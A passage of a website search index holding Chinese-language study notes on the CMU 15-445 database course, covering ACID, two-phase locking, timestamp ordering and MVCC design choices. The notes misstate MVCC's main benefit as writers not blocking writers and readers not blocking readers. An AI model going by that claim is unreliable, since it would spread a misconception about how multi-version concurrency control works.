<p>\u7eaf\u6446\u5b50\uff0c\u5177\u4f53\u5185\u5bb9\u90fd\u4e0d\u60f3\u8bb0\u5728\u4e0a\u9762\uff0c\u5efa\u8bae\u522b\u770b\u8fd9\u4efd\u7b14\u8bb0\u6765\u4f5c\u4e3a\u5b66\u4e60\u6750\u6599</p>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/","title":"8. Concurrency Control","text":""},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#8-concurrency-control","title":"8. Concurrency Control","text":"<p> \u7ea6 1701 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#acid","title":"ACID","text":"<p>Transactions</p> <p>\u4e8b\u52a1\u662f\u5728\u4e00\u4e2a\u5171\u4eab\u6570\u636e\u5e93\u4e0a\u6267\u884c\u7684\u4e00\u7cfb\u5217\u4e0d\u53ef\u62c6\u5206\u7684\u64cd\u4f5c\uff0c\u5b83\u4eec\u662f DBMS \u7684\u57fa\u672c\u66f4\u6539\u5355\u4f4d\uff0c\u5373\u4e8b\u52a1\u662f\u539f\u5b50\u64cd\u4f5c(atomic)\u3002</p> <p>Atomic</p> <p>\u793a\u4f8b\uff1a\u5c06 100 \u7f8e\u5143\u4ece Andy \u7684\u94f6\u884c\u8d26\u6237\u8f6c\u5165\u6211\u7684\u8d26\u6237</p> <ol> <li>\u68c0\u67e5 Andy \u662f\u5426\u6709 100 \u7f8e\u5143</li> <li>\u4ece\u4ed6\u7684\u8d26\u6237\u6263\u9664 100 \u7f8e\u5143</li> <li>\u5411\u6211\u7684\u8d26\u6237\u6dfb\u52a0 100 \u7f8e\u5143</li> </ol> <p>\u8981\u4e48\u5b8c\u6210\u6240\u6709\u6b65\u9aa4\uff0c\u8981\u4e48\u6240\u6709\u6b65\u9aa4\u90fd\u4e0d\u505a</p> <p>\u5728 SQL \u4e2d\uff0c\u4e8b\u52a1\u4ee5 <code>BEGIN</code> \u547d\u4ee4\u5f00\u59cb\uff0c\u82e5\u4e8b\u52a1\u7684\u7ed3\u679c\u662f <code>COMMIT</code> \uff0c\u5c06\u5176\u66f4\u6539\u4fdd\u5b58\u5728\u6570\u636e\u5e93\u4e2d\uff1b\u82e5\u4e8b\u52a1\u7684\u7ed3\u679c\u662f <code>ABORT</code> \uff0c\u64a4\u9500\u4e8b\u52a1\u7684\u6240\u6709\u66f4\u6539\u3002\u7528\u4e8e\u786e\u4fdd\u6570\u636e\u5e93\u6b63\u786e\u6027\u7684\u6807\u51c6\u7531\u9996\u5b57\u6bcd\u7f29\u5199 ACID \u7ed9\u51fa\uff1a</p> <ul> <li>Atomicity:  \u786e\u4fdd\u5355\u4e2a\u4e8b\u52a1\u662f\u539f\u5b50\u64cd\u4f5c\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u70b9<ul> <li>Approach 1: Logging DBMS \u8bb0\u5f55\u6240\u6709\u64cd\u4f5c\uff0c\u5982\u679c\u4e8b\u52a1\u7ed3\u679c\u662f <code>ABORT</code> \u5219\u53ef\u4ee5\u6839\u636e\u8bb0\u5f55\u64a4\u9500\u64cd\u4f5c\u3002\u51e0\u4e4e\u6240\u6709\u73b0\u4ee3 DBMS \u90fd\u4f7f\u7528 Logging \u65b9\u6cd5</li> <li>Approach 2: Shadow Paging DBMS \u521b\u5efa\u9700\u8981\u4fee\u6539\u7684 Page \u7684\u526f\u672c\u7ed9\u4e8b\u52a1\u4fee\u6539\uff0c\u4ec5\u5f53\u4e8b\u52a1\u7ed3\u679c\u4e3a <code>COMMIT</code> \u65f6\u5e94\u7528\u3002</li> </ul> </li> <li>Consistency: \u6570\u636e\u5e93\u521d\u59cb\u662f\u4e00\u81f4\u7684\uff0c\u4e14\u6bcf\u4e2a\u4e8b\u52a1\u90fd\u662f\u4e00\u81f4\u7684\uff0c\u5219\u8981\u4fdd\u8bc1\u7ed3\u675f\u65f6\u6570\u636e\u5e93\u4e5f\u662f\u4e00\u81f4\u7684\u3002\u4e00\u81f4\u6027\u6709\u4e24\u4e2a\u6982\u5ff5\uff1a<ul> <li>Database Consistency: \u6570\u636e\u5e93\u51c6\u786e\u8868\u793a\u5b83\u5efa\u6a21\u7684\u771f\u5b9e\u4e16\u754c\u5b9e\u4f53\uff0c\u5e76\u9075\u5faa Integrity \u7ea6\u675f\uff08\u5982\uff0c\u4e00\u4e2a\u4eba\u7684\u5e74\u9f84\u4e0d\u4f1a\u662f\u8d1f\u6570\uff09</li> <li>Transaction Consistency: \u6570\u636e\u5e93\u5728\u4e8b\u52a1\u524d\u662f\u4e00\u81f4\u7684\uff0c\u5219\u4e8b\u52a1\u540e\u4e5f\u662f\u4e00\u81f4\u7684\u3002\u786e\u4fdd\u4e8b\u52a1\u4e00\u81f4\u6027\u662f\u5e94\u7528\u7a0b\u5e8f\u7684\u8d23\u4efb\u3002</li> </ul> </li> <li>Isolation: \u5355\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u8981\u4e0e\u5176\u5b83\u4e8b\u52a1\u4e0d\u76f8\u4e92\u5f71\u54cd\u3002DBMS \u5fc5\u987b\u5728\u4fdd\u6301\u9694\u79bb\u9519\u89c9\u7684\u540c\u65f6\uff0c\u4ea4\u9519\u6267\u884c\u5e76\u53d1\u4e8b\u52a1<ul> <li>\u5e76\u53d1\u63a7\u5236\u534f\u8bae\u5206\u4e3a\u4e24\u5927\u7c7b:<ul> <li>Pessimistic: DBMS \u5047\u8bbe\u4e8b\u52a1\u603b\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u56e0\u6b64\u5b83\u9996\u8981\u76ee\u6807\u662f\u4e0d\u8ba9\u51b2\u7a81\u95ee\u9898\u53d1\u751f</li> <li>Optimistic: DBMS \u5047\u8bbe\u4e8b\u52a1\u51b2\u7a81\u5f88\u5c11\u53d1\u751f\uff0c\u56e0\u6b64\u5b83\u9009\u62e9\u5728\u4e8b\u52a1\u63d0\u4ea4\u540e\u53d1\u751f\u51b2\u7a81\u65f6\u5904\u7406</li> </ul> </li> <li>\u5982\u679c\u4e24\u4e2a\u4e8b\u52a1\u4e2d\u7684\u4e24\u4e2a\u64cd\u4f5c\u8981\u5bf9\u540c\u4e00\u4e2a\u5bf9\u8c61\u6267\u884c\uff0c\u5e76\u4e14\u81f3\u5c11\u6709\u4e00\u4e2a\u64cd\u4f5c\u662f\u5199\u5165\u64cd\u4f5c\uff0c\u5219\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u5b83\u6709\u4e09\u79cd\u53d8\u4f53\uff1a<ul> <li>Read-Write Conflicts (Unrepeatable Reads): \u4e00\u4e2a\u4e8b\u52a1\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u8fdb\u884c\u591a\u6b21\u8bfb\u53d6\uff0c\u65e0\u6cd5\u83b7\u5f97\u76f8\u540c\u7684\u503c</li> <li>Write-Read Conflicts (Dirty Reads): \u5728\u5176\u5b83\u4e8b\u52a1\u7684\u5199\u5165\u64cd\u4f5c <code>COMMIT</code> \u4e4b\u524d\uff0c\u4e00\u4e2a\u4e8b\u52a1\u5c31\u5df2\u7ecf\u8bfb\u53d6\u5230\u66f4\u6539\u540e\u7684\u503c</li> <li>Write-Write Conflicts (Lost Update): \u4e00\u4e2a\u4e8b\u52a1\u8986\u76d6\u53e6\u4e00\u4e2a\u5e76\u53d1\u4e8b\u52a1\u7684\u672a\u63d0\u4ea4\u6570\u636e</li> </ul> </li> </ul> </li> <li>Durability: \u5982\u679c\u4e8b\u52a1\u7ed3\u679c\u662f <code>COMMIT</code>\uff0c\u5b83\u5bf9\u6570\u636e\u5e93\u7684\u5f71\u54cd\u9700\u8981\u6301\u7eed\u5b58\u5728<ul> <li>DBMS \u53ef\u4ee5\u4f7f\u7528 Logging \u6216\u8005 Shadow Paging \u6765\u786e\u4fdd\u66f4\u6539\u662f Durable \u7684\u3002</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#two-phase-locking","title":"Two-Phase Locking","text":"<p>DBMS \u4f7f\u7528 Locks \u4e3a\u4e8b\u52a1\u52a8\u6001\u751f\u6210\u53ef\u5e8f\u5217\u5316\u7684 Execution Schedule\uff0c\u5e76\u4e14\u4e0d\u9700\u8981\u63d0\u524d\u77e5\u9053\u6bcf\u4e2a\u4e8b\u52a1\u7684\u8bfb\u5199\u8bbe\u7f6e\uff0c\u8fd9\u4e9b Locks \u5728\u5e76\u53d1\u8bbf\u95ee\u4e0b\u4fdd\u62a4\u6570\u636e\u5e93\u5bf9\u8c61\u3002</p> <p>Locks \u6709\u4e24\u79cd\u57fa\u672c\u7c7b\u578b\uff1a</p> <ul> <li>Shared Lock (S-LOCK): \u5141\u8bb8\u591a\u4e2a\u4e8b\u52a1\u540c\u65f6\u8bfb\u53d6\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002\u5982\u679c\u4e00\u4e2a\u4e8b\u52a1\u6301\u6709 Shared Lock\uff0c\u53e6\u4e00\u4e2a\u4e8b\u52a1\u4e5f\u53ef\u4ee5\u83b7\u53d6\u76f8\u540c\u7684 Shared Lock</li> <li>Exclusive Lock (X-LOCK): \u6392\u5b83\u9501\u53ea\u5141\u8bb8\u4e00\u4e2a\u4e8b\u52a1\u4fee\u6539\u5bf9\u8c61\uff0c\u5e76\u4e14\u4f1a\u963b\u6b62\u5176\u5b83\u4e8b\u52a1\u83b7\u53d6\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u7684\u4efb\u4f55\u9501</li> </ul> <p>\u5bf9\u6bd4 Latch</p> <p>Latches \u662f\u4ece\u5176\u5b83\u7ebf\u7a0b\u4e2d\u5e95\u5c42\u5730\u4fdd\u62a4 DBMS \u5185\u90e8\u5173\u952e\u6570\u636e\u7ed3\u6784\u7684\u539f\u8bed\u3002Latches \u4ec5\u5728\u6267\u884c\u64cd\u4f5c\u65f6\u4fdd\u6301\uff0c\u4e14\u4e0d\u9700\u8981\u56de\u6eda\u66f4\u6539\u3002\u9501\u5b58\u5668\u6709\u4e24\u79cd\u6a21\u5f0f\uff1a</p> <ul> <li>READ:\u00a0\u5141\u8bb8\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bfb\u53d6\u540c\u4e00\u9879\u3002\u5373\u4fbf\u4e00\u4e2a\u7ebf\u7a0b\u5df2\u7ecf\u83b7\u53d6\u4e86 Read Latch\uff0c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5b83</li> <li>WRITE:\u00a0\u53ea\u5141\u8bb8\u4e00\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u8be5\u9879\u3002\u5982\u679c\u4e00\u4e2a\u7ebf\u7a0b\u5df2\u7ecf\u83b7\u53d6\u4e86 Write Latch\uff0c\u90a3\u4e48\u5176\u5b83\u7ebf\u7a0b\u4e0d\u518d\u80fd\u591f\u83b7\u5f97\u5b83\u3002\u6301\u6709 Write Latch \u7684\u7ebf\u7a0b\u8fd8\u4f1a\u963b\u6b62\u5176\u5b83\u7ebf\u7a0b\u83b7\u5f97 Read Latch\u3002</li> </ul> <p>\u4e8b\u52a1\u5411 Lock Manager \u8bf7\u6c42 Lock\uff0c\u800c Lock Manager \u6839\u636e\u5176\u5b83\u4e8b\u52a1\u5f53\u524d\u6301\u6709\u7684\u9501\u6765\u51b3\u5b9a\u540c\u610f\u6216\u963b\u6b62\u8bf7\u6c42\u3002Lock Manager \u5185\u90e8\u7ef4\u62a4\u4e00\u4e2a Lock-Table\uff0c\u5b58\u653e\u54ea\u4e9b\u4e8b\u52a1\u6301\u6709\u9501\u4ee5\u53ca\u54ea\u4e9b\u4e8b\u52a1\u5728\u7b49\u5f85\u83b7\u53d6\u9501\u3002</p> <p>Lock-Table \u4e0d\u9700\u8981\u662f Durable \u7684\uff0c\u56e0\u4e3a\u5f53 DBMS \u5d29\u6e83\u65f6\uff0c\u6240\u6709\u4ecd\u5728\u8fd0\u884c\u7684\u4e8b\u52a1\u90fd\u4f1a\u81ea\u52a8\u4e2d\u6b62</p> <p>Two-Phase Locking \u5c5e\u4e8e Pessimistic \u5e76\u53d1\u63a7\u5236\u534f\u8bae\uff0c\u5e76\u4e14\u8be5\u534f\u8bae\u4e0d\u9700\u8981\u63d0\u524d\u77e5\u9053\u4e8b\u52a1\u5c06\u6267\u884c\u7684\u6240\u6709\u67e5\u8be2\u64cd\u4f5c\u3002</p> <ul> <li>Phase 1 - Growing: \u5728 Growing \u9636\u6bb5\uff0c\u6bcf\u4e2a\u4e8b\u52a1\u90fd\u4ece DBMS \u7684 Lock Manager \u8bf7\u6c42\u5b83\u9700\u8981\u7684\u9501\uff0cLock Manager \u6388\u6743/\u62d2\u7edd\u8fd9\u4e9b\u8bf7\u6c42</li> <li>Phase 2- Shrinking: \u4e8b\u52a1\u5728\u91ca\u653e\u5b83\u4eec\u7684\u7b2c\u4e00\u4e2a Lock \u65f6\u8fdb\u5165 Shrinking \u9636\u6bb5\uff0c\u5728\u6b64\u9636\u6bb5\u53ea\u5141\u8bb8\u4e8b\u52a1\u91ca\u653e Lock\uff0c\u5e76\u4e14\u4e0d\u80fd\u83b7\u53d6\u65b0\u7684\u9501</li> </ul> <p>Two-Phase Locking \u7f29\u5199\u4e3a 2PL</p> <p>2PL \u4ecd\u7136\u53ef\u80fd\u6709 Dirty Reads\u3001Deadlock \u7b49\u95ee\u9898\uff0c\u5177\u4f53\u89e3\u51b3\u65b9\u6cd5\u8bf7\u770b Lecture 16</p>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#timestamp-ordering-concurrency-control","title":"Timestamp Ordering Concurrency Control","text":"<p>\u65f6\u95f4\u6233\u6392\u5e8f\u5c5e\u4e8e Optimistic \u5e76\u53d1\u63a7\u5236\u534f\u8bae\u3002\u76f8\u6bd4\u4e8b\u52a1\u5728\u88ab\u5141\u8bb8\u8bfb\u5199\u524d\u9700\u8981\u83b7\u53d6\u9501\uff0c\u65f6\u95f4\u6233\u6392\u5e8f\u4f7f\u7528\u65f6\u95f4\u6233\u6765\u786e\u5b9a\u4e8b\u52a1\u7684\u53ef\u5e8f\u5217\u5316\u987a\u5e8f\u3002</p> <p>\u6bcf\u4e2a\u4e8b\u52a1 \\(T_i\\) \u90fd\u88ab\u5206\u914d\u4e86\u4e00\u4e2a\u72ec\u7279\u7684\u56fa\u5b9a\u65f6\u95f4\u6233 \\(TS(T_i)\\)\uff0c\u4e0d\u540c\u7684\u5177\u4f53\u65b9\u6848\u5206\u914d\u65f6\u95f4\u6233\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4e00\u4e9b\u9ad8\u7ea7\u65b9\u6848\u751a\u81f3\u4e3a\u6bcf\u4e2a\u4e8b\u52a1\u5206\u914d\u591a\u4e2a\u65f6\u95f4\u6233\u3002</p> <p>\u5982\u679c \\(TS(T_i) &lt;TS(T_j)\\)\uff0c\u90a3\u4e48 DBMS \u5fc5\u987b\u4fdd\u8bc1 Execution Schedule \u4e2d \\(T_i\\) \u5728\u5e8f\u5217\u5316\u987a\u5e8f\u65e9\u4e8e \\(T_j\\)\u3002</p> <p>\u65f6\u95f4\u6233\u5206\u914d\u7b56\u7565</p> <p>DBMS \u53ef\u4ee5\u4f7f\u7528\u7cfb\u7edf\u65f6\u949f\u4f5c\u4e3a\u65f6\u95f4\u6233\uff0c\u4f46\u662f\u8fd9\u5728\u590f\u4ee4\u7b49\u6781\u7aef\u65f6\u6bb5\u4f1a\u51fa\u73b0\u95ee\u9898\uff1b\u53e6\u4e00\u79cd\u9009\u62e9\u662f\u4f7f\u7528 Logical Counter\uff0c\u4f46\u662f\u8fd9\u5b58\u5728\u6ea2\u51fa\u548c\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u96be\u4ee5\u7ef4\u62a4\u7684\u95ee\u9898\u3002\u4e00\u4e9b\u6df7\u5408\u65b9\u6cd5\u7ed3\u5408\u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6848\u3002</p> <p>Basic Timestamp Ordering Protocol(BASIC T/O) \u5141\u8bb8\u5728\u4e0d\u9002\u7528 Lock \u7684\u60c5\u51b5\u4e0b\u5bf9\u6570\u636e\u5e93\u5bf9\u8c61\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\u3002\u4f5c\u4e3a\u66ff\u4ee3\uff0c\u5bf9\u4e8e\u4efb\u610f\u6570\u636e\u5e93\u5bf9\u8c61 \\(X\\)\uff0c\u5b83\u90fd\u4f1a\u88ab\u6807\u8bb0\u4e0a\u6700\u540e\u6210\u529f\u6267\u884c\u8bfb\u64cd\u4f5c\u7684\u65f6\u95f4\u6233 \\(R-TS(X)\\) \u6216\u5199\u64cd\u4f5c\u7684\u65f6\u95f4\u6233 \\(W-TS(X)\\)\u3002</p> <p>\u5bf9\u4e8e\u4efb\u610f\u64cd\u4f5c\uff0c\u6570\u636e\u5e93\u4f1a\u68c0\u67e5\u5176\u4f5c\u7528\u5bf9\u8c61\u7684\u65f6\u95f4\u6233\uff0c\u5982\u679c\u4e8b\u52a1\u8bd5\u56fe\u4ee5\u8fdd\u53cd\u65f6\u95f4\u6233\u6392\u5e8f\u7684\u65b9\u5f0f\u8bbf\u95ee\u5bf9\u8c61\uff0c\u5219\u8be5\u4e8b\u52a1\u4f1a\u88ab\u4e2d\u6b62\u5e76\u91cd\u65b0\u542f\u52a8\u3002\u7531\u4e8e\u65f6\u95f4\u6233\u6392\u5e8f\u5047\u8bbe\u8fdd\u53cd\u89c4\u5219\u7684\u60c5\u51b5\u5f88\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u8fd9\u4e9b\u91cd\u542f\u4e5f\u5f88\u5c11\u53d1\u751f\u3002</p>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#multi-version-concurrency-control","title":"Multi-Version Concurrency Control","text":"<p>MVCC \u4e0d\u4ec5\u662f\u4e00\u4e2a\u5e76\u53d1\u63a7\u5236\u534f\u8bae\uff0c\u5b83\u6d89\u53ca\u5230\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u8bbe\u8ba1\u548c\u5b9e\u73b0\u7684\u5404\u4e2a\u65b9\u9762\u3002</p> <p>MVCC \u662f DBMS \u4e2d\u6700\u5e7f\u6cdb\u4f7f\u7528\u7684\u65b9\u6848</p> <p>\u5728 MVCC \u4e0b\uff0cDBMS \u4e3a\u6bcf\u4e2a\u903b\u8f91\u5bf9\u8c61\u7ef4\u62a4\u591a\u4e2a\u7269\u7406\u7248\u672c\uff0c\u5f53\u4e8b\u52a1\u5199\u5165\u5bf9\u8c61\u65f6\uff0cDBMS \u521b\u5efa\u4e00\u4e2a\u8be5\u5bf9\u8c61\u7684\u65b0\u7248\u672c\uff1b\u5f53\u4e8b\u52a1\u8bfb\u53d6\u5bf9\u8c61\u65f6\uff0c\u5b83\u8bfb\u53d6\u5bf9\u8c61\u7684\u6700\u65b0\u7248\u672c\u3002</p> <p>MVCC \u7684\u4e00\u4e2a\u57fa\u672c\u4f18\u70b9\u662f Writer \u4e0d\u4f1a\u963b\u585e Writer\uff0cReader \u4e0d\u4f1a\u963b\u585e Reader\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u4e00\u4e2a\u4e8b\u52a1\u4fee\u6539\u5bf9\u8c61\u7684\u540c\u65f6\uff0c\u5176\u5b83\u4e8b\u52a1\u53ef\u4ee5\u8bfb\u53d6\u8be5\u5bf9\u8c61\u7684\u65e7\u7248\u672c\u3002</p> <p>\u6b64\u5916\uff0c\u591a\u7248\u672c\u6570\u636e\u5e93\u8fd8\u53ef\u4ee5\u8f7b\u677e\u652f\u6301 time-travel queries\uff0c\u4f8b\u5982\u5bf9 3 \u5c0f\u65f6\u524d\u7684\u6570\u636e\u5e93\u8fdb\u884c\u67e5\u8be2\u3002</p> <p>MVCC \u6709\u56db\u4e2a\u91cd\u8981\u8bbe\u8ba1\u51b3\u7b56\uff1a</p> <ol> <li>Concurrency Control Protocol</li> <li>Version Storage</li> <li>Garbage Collection</li> <li>Index Management</li> </ol> <p>\u5176\u4e2d Concurrency Control Protocol \u53ef\u4ee5\u9009\u7528\u524d\u51e0\u8282\u7684 Two-Phase Locking\u3001Timestamp-Ordering \u7b49\u3002</p>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#version-storage","title":"Version Storage","text":"<p>Version Storage \u6709\u5173\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u5982\u4f55\u5b58\u50a8\u903b\u8f91\u5bf9\u8c61\u7684\u7269\u7406\u7248\u672c\u4ee5\u53ca\u4e8b\u52a1\u5982\u4f55\u627e\u5230\u5bf9\u5b83\u4eec\u53ef\u89c1\u7684\u6700\u65b0\u7248\u672c\u3002</p> <p>DBMS \u5728\u5143\u7ec4\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u6307\u9488\u5b57\u6bb5\uff0c\u4e3a\u6bcf\u4e2a\u903b\u8f91\u5143\u7ec4\u521b\u5efa\u4e00\u4e2a\u7248\u672c\u94fe\uff0c\u5176\u672c\u8d28\u662f\u4e00\u4e2a\u6309\u7167\u65f6\u95f4\u6233\u6392\u5e8f\u7684\u7248\u672c\u94fe\u8868\u3002\u7d22\u5f15\u59cb\u7ec8\u4e3a\u94fe\u8868\u7684\u201c\u5934\u90e8\u201d\uff0c\u5373\u53d6\u51b3\u4e8e\u8bbe\u8ba1\uff0c\u8981\u4e48\u6307\u5411\u6700\u65b0\u7248\u672c\uff0c\u8981\u4e48\u6307\u5411\u6700\u65e7\u7248\u672c\uff0c\u7ebf\u7a0b\u904d\u5386\u94fe\u8868\u77e5\u9053\u627e\u5230\u6b63\u786e\u7684\u7248\u672c\u3002</p> <ul> <li>\u65b9\u6848\u4e00: Append-Only Storage<ul> <li>\u903b\u8f91\u5143\u7ec4\u7684\u6240\u6709\u7269\u7406\u7248\u672c\u90fd\u5b58\u50a8\u5728\u540c\u4e00\u8868\u7a7a\u95f4\u4e2d\uff0c\u6bcf\u6b21\u66f4\u65b0\u53ea\u9700\u8981\u5c06\u65b0\u7248\u672c\u8ffd\u52a0\u5230\u8868\u4e2d\u5e76\u66f4\u65b0\u7248\u672c\u94fe</li> <li>\u5982\u679c\u7248\u672c\u94fe\u6309\u6700\u65b0\u5230\u6700\u8001(N2O)\u6392\u5e8f\uff0c\u5219\u6bcf\u6b21\u6dfb\u52a0\u65b0\u7248\u672c\u90fd\u8981\u66f4\u65b0\u7d22\u5f15</li> </ul> </li> <li>\u65b9\u6848\u4e8c: Time-Travel Storage<ul> <li>DBMS \u7ef4\u62a4\u4e00\u4e2a\u72ec\u7acb\u7684 time-travel table\uff0c\u8be5\u8868\u5b58\u50a8\u5143\u7ec4\u7684\u65e7\u7248\u672c\u3002\u6bcf\u6b21\u66f4\u65b0\u65f6\uff0cDBMS \u5c06\u5143\u7ec4\u7684\u65e7\u7248\u672c\u590d\u5236\u5230 time-travel table \u4e2d\uff0c\u5e76\u7528\u65b0\u6570\u636e\u8986\u76d6\u4e3b\u8868\u4e2d\u7684\u5143\u7ec4\u3002\u4e3b\u8868\u4e2d\u7684\u5143\u7ec4\u6307\u9488\u6307\u5411 time-travel table \u4e2d\u7684\u8fc7\u53bb\u7248\u672c</li> </ul> </li> <li>\u65b9\u6848\u4e09: Delta Storage<ul> <li>\u4e0e\u65b9\u6848\u4e8c\u7c7b\u4f3c\uff0c\u4f46\u662f DBMS \u53ea\u5b58\u50a8 Deltas\u3002\u6240\u8c13 Deltas \u5373\u65b0\u65e7\u7248\u672c\u4e4b\u95f4\u5143\u7ec4\u7684\u53d8\u5316\uff0c\u4e8b\u52a1\u901a\u8fc7\u904d\u5386 Deltas \u6765\u91cd\u65b0\u521b\u5efa\u65e7\u7248\u672c</li> <li>\u6bd4 Time-Travel Storage \u5199\u5165\u66f4\u5feb\uff0c\u4f46\u662f\u8bfb\u53d6\u66f4\u6162</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#garbage-collection","title":"Garbage Collection","text":"<p>\u6570\u636e\u5e93\u7cfb\u7edf\u9700\u8981\u968f\u7740\u65f6\u95f4\u63a8\u79fb\u4ece\u6570\u636e\u5e93\u4e2d\u79fb\u9664\u53ef\u56de\u6536\u7684\u7269\u7406\u7248\u672c\u3002\u5982\u679c\u4e00\u4e2a\u7248\u672c\u4e0d\u53ef\u88ab\u4efb\u4f55\u6d3b\u52a8\u4e8b\u52a1\u8bbf\u95ee\uff0c\u6216\u8005\u5b83\u662f\u7531\u4e00\u4e2a\u88ab\u4e2d\u6b62\u7684\u4e8b\u52a1\u521b\u5efa\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7248\u672c\u5c31\u662f\u53ef\u56de\u6536\u7684\u3002</p> <p>Approach 1: Tuple-level GC</p> <p>\u5728\u5143\u7ec4\u7ea7\u522b\u7684\u5783\u573e\u56de\u6536\uff0cDBMS \u901a\u8fc7\u76f4\u63a5\u68c0\u67e5\u5143\u7ec4\u6765\u627e\u5230\u65e7\u7248\u672c\uff0c\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\u6709\u4e24\u79cd\u7b56\u7565\uff1a</p> <ul> <li>Background Vacuuming: \u6709\u4e00\u5355\u72ec\u7ebf\u7a0b\u5b9a\u671f\u626b\u63cf\u8868\u5e76\u67e5\u627e\u53ef\u56de\u6536\u7684\u7248\u672c\u3002<ul> <li>\u9002\u7528\u4e8e\u4efb\u610f\u7248\u672c\u5b58\u50a8\u65b9\u6848\uff0c\u4e00\u4e2a\u7b80\u5355\u4f18\u5316\u662f\u7ef4\u62a4\u4e00\u4e2a Dirty Page Bitmap\uff0c\u8ddf\u8e2a\u81ea\u4e0a\u6b21\u626b\u63cf\u4ee5\u6765\u54ea\u4e9b\u9875\u9762\u88ab\u4fee\u6539</li> </ul> </li> <li>Cooperative Cleaning: \u5de5\u4f5c\u7ebf\u7a0b\u5728\u904d\u5386\u7248\u672c\u94fe\u65f6\u8bc6\u522b\u53ef\u56de\u6536\u7248\u672c<ul> <li>\u8fd9\u53ea\u9002\u7528\u4e8e O2N \u94fe</li> </ul> </li> </ul> <p>Approach 2: Transaction-level GC</p> <p>\u5728\u4e8b\u52a1\u7ea7\u522b\u7684\u5783\u573e\u56de\u6536\u4e2d\uff0c\u6bcf\u4e2a\u4e8b\u52a1\u8d1f\u8d23\u8ddf\u8e2a\u81ea\u5df1\u7684\u65e7\u7248\u672c\uff0cDBMS \u4e0d\u5fc5\u626b\u63cf\u5143\u7ec4\u3002\u5f53\u4e00\u4e2a\u4e8b\u52a1\u5b8c\u6210\uff0cGarbage Collector \u4f7f\u7528\u4e8b\u52a1\u7ef4\u62a4\u7684\u8bfb\u5199\u96c6\u6765\u8bc6\u522b\u54ea\u4e9b\u5143\u7ec4\u53ef\u4ee5\u56de\u6536\u3002</p>"},{"location":"Accumulation/CMU15-445/Concurrency%20Control/#index-management","title":"Index Management","text":"<p>\u6240\u6709 Primary Key(pkey) indexes \u90fd\u6307\u5411\u7248\u672c\u94fe\u5934\u90e8\u3002DBMS \u66f4\u65b0 pkey \u7684\u9891\u7387\u53d6\u51b3\u4e8e\u5143\u7ec4\u66f4\u65b0\u65f6\u662f\u5426\u6709\u65b0\u7248\u672c\u88ab\u521b\u5efa\u3002</p> <p>\u4e8b\u52a1\u66f4\u65b0 pkey\uff0c\u8fd9\u4e00\u64cd\u4f5c\u88ab\u89c6\u4e3a <code>DELETE</code> =&gt; <code>INSERT</code></p> <p>\u7ba1\u7406 Secondary Indexes \u60c5\u51b5\u66f4\u52a0\u590d\u6742\uff0c\u901a\u5e38\u6709\u5982\u4e0b\u4e24\u79cd\u529e\u6cd5\u5904\u7406\uff1a</p> <ul> <li>Logical Pointers<ul> <li>\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u5143\u7ec4\u8bbe\u7f6e\u4e00\u4e2a\u56fa\u5b9a\u6807\u8bc6\u7b26\uff0c\u4f7f\u7528\u4e00\u4e2a\u989d\u5916\u7684\u95f4\u63a5\u5c42\u6765\u8bb2\u903b\u8f91 ID \u8f6c\u6362\u5230\u5143\u7ec4\u7684\u7269\u7406\u4f4d\u7f6e\uff0c\u800c\u5143\u7ec4\u7684\u66f4\u65b0\u53ea\u9700\u8981\u66f4\u6539\u95f4\u63a5\u5c42\u4e2d\u7684\u6620\u5c04</li> </ul> </li> <li>Physical Pointers<ul> <li>DBMS \u4f7f\u7528\u7248\u672c\u94fe\u5934\u90e8\u7684\u7269\u7406\u5730\u5740\u3002\u4f46\u662f\u8fd9\u79cd\u7b56\u7565\u8981\u6c42\u5934\u90e8\u66f4\u65b0\u65f6\u6bcf\u4e2a index \u90fd\u8981\u76f8\u5e94\u66f4\u6539</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Course%20Overview/","title":"1. Course Overview","text":""},{"location":"Accumulation/CMU15-445/Course%20Overview/#1-course-overview","title":"1. Course Overview","text":"<p> \u7ea6 884 \u4e2a\u5b57  35 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Course%20Overview/#definition","title":"Definition","text":"<p>\u6839\u636e\u4e00\u822c\u5b9a\u4e49\uff0c\u6570\u636e\u5e93\u6307\u7684\u662f\u4e00\u7ec4\u4ee5\u67d0\u79cd\u5173\u7cfb\u76f8\u4e92\u5173\u8054\u7684\u6570\u636e\u3002\u6211\u4eec\u5e38\u8bf4\u7684 MySQL\u3001Oracle\u3001MongoDB\u3001Snowflake 